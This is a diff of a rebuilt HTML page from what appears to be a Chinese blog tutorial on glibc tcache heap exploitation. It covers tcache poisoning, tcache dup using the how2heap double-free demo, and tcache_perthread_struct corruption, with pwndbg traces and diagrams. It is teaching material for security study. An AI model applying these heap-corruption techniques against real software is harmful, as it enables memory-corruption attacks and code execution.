   <span class="nf">entries</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x555555756260</span><span class="p">,</span> <span class="mi">0x0</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">56</span> <span class="no">times</span><span class="err">&gt;}</span>
-<span class="err">}</span></code></pre></td></tr></table>
+<span class="err">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看到，此时第 8 条 tcache 链上已经有了一个 chunk，从 <code>tcache_prethread_struct</code> 结构体中也能得到同样的结论</p>
-
+</div><p>可以看到，此时第 8 条 tcache 链上已经有了一个 chunk，从 <code>tcache_prethread_struct</code> 结构体中也能得到同样的结论</p>
 <p>然后修改 tcache 的 next</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">  1
+<pre class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -1485,15 +1434,14 @@ We got the control</code></pre></td></tr></table>
                   <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
        <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
             <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
-<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span></code></pre></td></tr></table>
+<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>此时，第 8 条 tcache 链的 next 已经被改成栈上的地址了。接下来类似 fastbin attack，只需进行两次 <code>malloc(128)</code> 即可控制栈上的空间。</p>
-
+</div><p>此时，第 8 条 tcache 链的 next 已经被改成栈上的地址了。接下来类似 fastbin attack，只需进行两次 <code>malloc(128)</code> 即可控制栈上的空间。</p>
 <p>第一次 malloc</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1638,13 +1586,13 @@ We got the control</code></pre></td></tr></table>
                   <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
        <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
             <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
-<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span></code></pre></td></tr></table>
+<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>第二次 malloc，即可 malloc 栈上的地址了</p>
+</div><p>第二次 malloc，即可 malloc 栈上的地址了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1793,17 +1741,15 @@ We got the control</code></pre></td></tr></table>
 <span class="err">06:0030│</span>          <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">◂—</span> <span class="mi">0x0</span>
 <span class="err">07:0038│</span>          <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—▸</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—▸</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">◂—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">i</span> <span class="no">r</span> <span class="no">rax</span>
-<span class="nf">rax</span>            <span class="mi">0x7fffffffdfa8</span>	<span class="mi">140737488347048</span></code></pre></td></tr></table>
+<span class="nf">rax</span>            <span class="mi">0x7fffffffdfa8</span>	<span class="mi">140737488347048</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看出 <code>tache posioning</code> 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。</p>
-
+</div><p>可以看出 <code>tache posioning</code> 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。</p>
 <h3 id="tcache-dup">tcache dup</h3>
-
 <p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1822,17 +1768,15 @@ We got the control</code></pre></td></tr></table>
   <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
   <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
-
+</div><p>可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
 <p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
-
 <p>以 how2heap 的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">tcache_dup</a> 为例分析，源码如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1865,13 +1809,13 @@ We got the control</code></pre></td></tr></table>
 <span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
        <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">tcache_dup</span><span class="p">.</span><span class="n">c</span>
 <span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
-   <span class="mi">1</span>   <span class="err">│</span> <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp"></span>   <span class="mi">2</span>   <span class="err">│</span> <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp"></span>   <span class="mi">3</span>   <span class="err">│</span> 
+   <span class="mi">1</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+   <span class="mi">2</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+   <span class="mi">3</span>   <span class="err">│</span> 
    <span class="mi">4</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
    <span class="mi">5</span>   <span class="err">│</span> <span class="p">{</span>
-   <span class="mi">6</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;This file demonstrates a simple double-free attack with</span><span class="err">
-</span><span class="err"></span><span class="s">       │  tcache.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+   <span class="mi">6</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;This file demonstrates a simple double-free attack with</span>
+       <span class="err">│</span>  <span class="n">tcache</span><span class="p">.</span><span class="err">\</span><span class="n">n</span><span class="s">&#34;);</span>
    <span class="mi">7</span>   <span class="err">│</span> 
    <span class="mi">8</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Allocating buffer.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="mi">9</span>   <span class="err">│</span>         <span class="kt">int</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
@@ -1887,13 +1831,13 @@ We got the control</code></pre></td></tr></table>
   <span class="mi">18</span>   <span class="err">│</span> 
   <span class="mi">19</span>   <span class="err">│</span>         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
   <span class="mi">20</span>   <span class="err">│</span> <span class="p">}</span>
-<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span></code></pre></td></tr></table>
+<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>调试一下，第一次 free</p>
+</div><p>调试一下，第一次 free</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2040,15 +1984,14 @@ We got the control</code></pre></td></tr></table>
                   <span class="nl">top:</span> <span class="err">0</span><span class="nf">x555555756270</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d90</span><span class="p">)</span> 
        <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
             <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
-<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span></code></pre></td></tr></table>
+<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>tcache 的第一条链放入了一个 chunk</p>
-
+</div><p>tcache 的第一条链放入了一个 chunk</p>
 <p>第二次 free 时，虽然 free 的是同一个 chunk，但因为 <code>tcache_put()</code> 没有做任何检查，因此程序不会 crash</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2191,21 +2134,17 @@ We got the control</code></pre></td></tr></table>
                   <span class="nl">top:</span> <span class="err">0</span><span class="nf">x555555756270</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d90</span><span class="p">)</span> 
        <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
             <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
-<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555756260</span> <span class="p">(</span><span class="no">overlap</span> <span class="no">chunk</span> <span class="no">with</span> <span class="mi">0x555555756250</span><span class="p">(</span><span class="no">freed</span><span class="p">)</span> <span class="p">)</span></code></pre></td></tr></table>
+<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555756260</span> <span class="p">(</span><span class="no">overlap</span> <span class="no">chunk</span> <span class="no">with</span> <span class="mi">0x555555756250</span><span class="p">(</span><span class="no">freed</span><span class="p">)</span> <span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以看出，这种方法与 <code>fastbin dup</code> 相比也简单了很多。</p>
-
+</div><p>可以看出，这种方法与 <code>fastbin dup</code> 相比也简单了很多。</p>
 <h3 id="tcache-perthread-corruption">tcache perthread corruption</h3>
-
 <p>我们已经知道 <code>tcache_perthread_struct</code> 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p>
-
 <p>这里没找到太好的例子，自己想了一种情况</p>
-
 <p>设想有如下的堆排布情况</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2217,9 +2156,9 @@ We got the control</code></pre></td></tr></table>
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">tcache_    +------------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">tcache_    +------------+
 \perthread |......      |
 \_struct   +------------+
            |counts[i]   |
@@ -2230,13 +2169,13 @@ We got the control</code></pre></td></tr></table>
            +------------+          |NULL      |
            |......      |          +----------+
            |            |          |          |
-           +------------+          +----------+</pre></td></tr></table>
+           +------------+          +----------+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>通过一些手段（如 <code>tcache posioning</code>），我们将其改为了</p>
+</div><p>通过一些手段（如 <code>tcache posioning</code>），我们将其改为了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2248,9 +2187,9 @@ We got the control</code></pre></td></tr></table>
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">tcache_    +------------+&lt;---------------------------+
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">tcache_    +------------+&lt;---------------------------+
 \perthread |......      |                            |
 \_struct   +------------+                            |
            |counts[i]   |                            |
@@ -2261,21 +2200,15 @@ We got the control</code></pre></td></tr></table>
            +------------+          |target    |------+
            |......      |          +----------+
            |            |          |          |
-           +------------+          +----------+</pre></td></tr></table>
+           +------------+          +----------+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>这样，两次 malloc 后我们就返回了 <code>tcache_prethread_struct</code> 的地址，就可以控制整个 tcache 了。</p>
-
+</div><p>这样，两次 malloc 后我们就返回了 <code>tcache_prethread_struct</code> 的地址，就可以控制整个 tcache 了。</p>
 <p><strong>因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</strong></p>
-
-<h2 id="references-thanks-to">References &amp; thanks to:</h2>
-
+<h2 id="references--thanks-to">References &amp; thanks to:</h2>
 <p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a></p>
-
 <p><a href="http://tukan.farm/2017/07/08/tcache/">http://tukan.farm/2017/07/08/tcache/</a></p>
-
 <p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/tcache_exploitation.pdf">https://github.com/bash-c/slides/blob/master/pwn_heap/tcache_exploitation.pdf</a></p>
-
 <p><a href="https://www.secpulse.com/archives/71958.html">https://www.secpulse.com/archives/71958.html</a></p>
     </div>
 
@@ -2411,7 +2344,7 @@ We got the control</code></pre></td></tr></table>
     &copy;
     
        -
-    2019
+    2020
     <span class="heart">
       
       <i class="iconfont">
